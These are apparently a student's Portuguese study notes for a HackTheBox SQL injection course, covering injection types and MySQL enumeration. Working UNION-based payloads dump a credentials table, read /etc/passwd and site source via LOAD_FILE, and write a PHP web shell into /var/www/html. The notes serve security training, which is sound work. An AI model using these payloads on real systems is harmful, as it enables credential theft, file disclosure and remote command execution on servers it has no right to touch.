# SQL Injection Fundamentals (CWES)

- **`describe table;`** → ver as colunas e seus nomes na tabela.
    
    ```bash
    mysql -u root -p<password>
    # Podemos tambem colocar apenas -p e inserir a senha depois do Enter
    
    # Host remoto:
    mysql -u root -h docker.hackthebox.eu -P 3306 -p 
    ```
    

---

- **SQL Injections**
    - <u>**Tipos de SQL Injection**</u>
        1. **In-band SQL Injection**: o resultado da injeção é mostrado diretamente na página.
            - **Union-based**: usa `UNION` para combinar a resposta da injeção com a consulta original.
            - **Error-based**: força um erro no banco para exibir informações úteis.
        2. **Blind SQL Injection**: o resultado **não aparece diretamente**, então é inferido.
            - **Boolean-based**: usa condições (`IF`, `WHERE`) e observa mudanças na resposta da página.
            - **Time-based**: usa funções como `SLEEP()` para detectar atrasos baseados em condições verdadeiras ou falsas.
        3. **Out-of-band SQL Injection**: os dados são enviados para fora, como para um servidor controlado pelo atacante (ex: via DNS).
    - **Union** → apenas roda quando a quantidade de colunas dos dois selects eh a mesma, porem caso nao seja naturalmente, podemos forcar para que seja inserindo numeros para preencher, Ex:
        
        ```bash
        SELECT * FROM products WHERE product_id = '1'
        UNION SELECT username, 2, 3, 4 FROM passwords;
        ```
        
    - **Database Enumeration**
        - Testes comuns para identificar o v:
            
            
            | Payload | Situação de uso | Indicação de MySQL |
            | --- | --- | --- |
            | **`SELECT @@version`** | Quando há saída visível | Exibe versão do MySQL/MariaDB |
            | **`SELECT POW(1,1)`** | Apenas saída numérica | Retorna `1` |
            | **`SELECT SLEEP(5)`** | SQL Injection cega | Atraso de 5s indica MySQL |
        - E de acordo com o resultado, se for **MySQL/MariaDB**, podemos seguir enumerando com **INFORMATION_SCHEMA** (banco de dados interno que armazena metadados dos demais bancos)
        - Enumerando com **INFORMATION_SCHEMA**
            1. **Descobrir Bancos de Dados**
                
                ```sql
                ' UNION SELECT 1,SCHEMA_NAME,3,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -
                ```
                
                - **Ignorar** bancos padrão (information_schema, mysql, performance_schema, sys)
            2. **Banco Atual em Uso**
                
                ```sql
                ' UNION SELECT 1,DATABASE(),2,3-- -
                ```
                
            3. **Listar Tabelas (ex: banco `dev`)**
                
                ```sql
                ' UNION SELECT 1,TABLE_NAME,TABLE_SCHEMA,4 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='dev'-- -
                ```
                
            4. **Listar Colunas (ex: tabela `credentials`)**
                
                ```sql
                ' UNION SELECT 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='credentials'-- -
                ```
                
            5. **Dump de Dados (ex: `username`, `password`)**
                
                ```sql
                ' UNION SELECT 1,username,password,4 FROM dev.credentials-- -
                ```
                
    
    ---
    
    - **Privilegios do nosso User + Reading Files + Writing Files**
        - Para poder saber se conseguimos Ler/Escrever, Primeiramente precisamos checar o nosso usuario e depois os privilegios:
            
            ```sql
            SELECT USER()
            SELECT CURRENT_USER()
            SELECT user from mysql.user
            # Em um UNION ficaria assim:
            cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
            ```
            
        - Agora checamos os privilegios do usuario que temos:
            
            ```bash
            SELECT super_priv FROM mysql.user
            # No UNION:
            cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
            ```
            
            - SE RETORNAR MUITOS USUARIOS, podemos especificar com o nosso(ex: root):
            
            ```bash
            cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
            ```
            
        - Se retornar um **`y`** significa que temos **superuser** **privileges**, agora para saber se temos **FILE privileges**, rodamos (nosso user: **`root@localhost`**):
            
            ```bash
            cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
            ```
            
        
        ---
        
        - Ao retornar **FILE** privileges, podemos prosseguir:
        - **Reading Files**
            
            ```bash
            SELECT LOAD_FILE('/etc/passwd');
            # Em UNION:
            cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
            ```
            
            - Além de ler arquivos, podemos também ver o código fonte do website, tendo em vista que a página é **`search.php`** e que por padrão fica no diretório **`/var/www/html`**:
                
                ```bash
                cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
                ```
                
            - **ELE NÃO MOSTRARÁ instantaneamente o código**, portanto depois de rodar o comando precisamos pressionar **`Ctrl + U`.**
        - **Writing Files**
            - O **privilegio** **FILE** nao garante totalmente que temos permissao de escrita, por isso tambem precisamos verificar o **`secure_file_priv`:**
                
                ```sql
                cn' UNION SELECT 1, variable_name, variable_value, 4
                FROM information_schema.global_variables
                WHERE variable_name="secure_file_priv"-- -
                ```
                
                - `NULL`: ❌ Não é possível escrever arquivos.
                - Se vazio: ✅ Pode escrever em qualquer local (ex: `/tmp`, `/var/www/html`).
                - Se um diretório: ✅ Pode escrever **somente naquele diretório**.
            
            ---
            
            - Seguimos para escrever arquivos:
                
                ```sql
                # Dump da tabela 'users':
                SELECT * FROM users INTO OUTFILE '/tmp/credentials';
                
                # Gravar arquivo de teste acessivel na web:
                cn' UNION SELECT "",'OLA TESTE!',"", "" 
                INTO OUTFILE '/var/www/html/proof.txt'-- -
                ```
                
            - **ESCREVER WEB SHELL:**
                
                ```sql
                cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"",""
                INTO OUTFILE '/var/www/html/shell.php'-- -
                ```
                
                - Depois acessamos → **`http://host/shell.php?0=id`**
